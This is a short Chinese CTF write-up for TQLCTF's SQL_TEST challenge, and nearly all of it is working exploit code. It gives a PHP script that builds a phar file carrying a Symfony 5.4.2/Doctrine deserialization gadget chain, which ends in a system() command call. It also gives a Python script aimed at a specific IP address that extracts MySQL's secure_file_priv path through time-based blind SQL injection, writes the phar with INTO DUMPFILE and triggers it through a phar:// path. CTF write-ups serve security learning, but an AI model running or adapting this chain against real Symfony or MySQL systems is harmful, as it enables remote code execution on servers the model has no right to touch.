# 知识点
Symfony5.4.2反序列化链<br />时间盲注获取secure_file_path目录<br />phar反序列化<br />mysql相关函数触发phar反序列化<br />[TQLCTF-SQL_TEST出题笔记](https://igml.top/2022/02/20/TQLCTF2022/)<br />[Phar与Stream Wrapper造成PHP RCE的深入挖掘 - zsx’s Blog](https://blog.zsxsoft.com/post/38)
# 思路
```php
<?php


//namespace Doctrine\Bundle\DoctrineBundle\Dbal {
//    class SchemaAssetsFilterManager
//    {
//        private $schemaAssetFilters;
//
//        public function __construct()
//        {
//            $this->schemaAssetFilters = array('system');
//        }
//    }
//}
namespace Symfony\Component\Console\Helper {
    class Dumper
    {
        private $handler;

        public function __construct()
        {
            $this->handler = 'system';
        }
    }
}

namespace Symfony\Component\Cache\Traits {
    class RedisProxy
    {
        private $redis;
        private $initializer;
        private $ready = false;

        public function __construct()
        {
            $this->redis = 'id';
            $this->initializer = new \Symfony\Component\Console\Helper\Dumper();
//            $this->initializer = new \Doctrine\Bundle\DoctrineBundle\Dbal\SchemaAssetsFilterManager();
        }
    }
}

namespace Doctrine\Common\Cache\Psr6 {
    class CacheAdapter
    {
        private $deferredItems;

        public function __construct()
        {
            $this->deferredItems = array(new \Symfony\Component\Cache\Traits\RedisProxy());
        }
    }
}


namespace {
    $a = new Doctrine\Common\Cache\Psr6\CacheAdapter();
    $phar = new Phar('test.phar');
    $phar->stopBuffering();
    $phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
    $phar->addFromString('test.txt', 'test');
    $phar->setMetadata($a);
    $phar->stopBuffering();
}
```
```php
import requests, string, random, os, time

url = "http://1.14.71.254:28187"


def req(key, value):
    resp = requests.get(url + "/index.php/test", params={'key': key, 'value': value})
    return resp


def get_secure_file_priv():
    char_list = "_/" + string.ascii_letters + string.digits
    template = "select if((select substr(@@global.secure_file_priv,%s,1)='%s'),sleep(2),1)"
    data = ''
    for i in range(1, 100):
        flag = False
        for c in char_list:
            resp = req('3', template % (i, c))
            if resp.elapsed.seconds > 1.5:
                data += c
                flag = True
                print(data)
                break
        if not flag:
            print("end!")
            return data


def exp(secure_file_path):
    filename = "".join(random.sample(string.ascii_letters, 6)) + '.phar'
    file = os.path.join(secure_file_path, filename)

    # write phar file
    hex_data = open("test.phar", "rb").read().hex()
    command = "select 0x{} into dumpfile '{}'".format(hex_data, file)
    req('3', command)

    # check file exists
    command = "select if((ISNULL(load_file('{}'))),sleep(2),1)".format(file)
    if req('3', command).elapsed.seconds > 1.5:
        print("file write fail!")
        exit()

    # clean the cache
    req('3',"FLUSH PRIVILEGES")
    time.sleep(2)

    # trigger unserialize
    resp = req('35', 'phar://' + file)
    print(resp.text)


if __name__ == '__main__':
    secure_file_path = get_secure_file_priv()
    # secure_file_path = '/tmp/5fbbcb561e095973d7202199557bd389/'
    exp(secure_file_path)

```
